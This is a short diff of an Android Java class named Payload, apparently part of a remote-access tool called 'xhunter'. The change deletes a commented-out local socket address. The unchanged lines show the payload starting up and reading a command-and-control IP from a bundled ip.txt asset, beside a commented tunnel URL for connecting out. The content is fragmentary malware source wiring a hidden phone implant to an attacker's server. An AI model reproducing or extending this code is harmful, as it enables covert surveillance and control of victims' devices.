@@ -79,7 +79,6 @@ public class Payload {
     public static void main() {
         Log.e("xhunterTest", "<++++++++++++++++><><>><<<<>Successfully started myself++++>>>>>>>>");
        // connectToSocket("https://xhunter.loca.lt");
-       // connectToSocket("http://192.168.43.1:8080");
         try{
             BufferedReader reader = new BufferedReader(new InputStreamReader(mcontext.getAssets().open("ip.txt")));
             String ip=reader.readLine().trim();
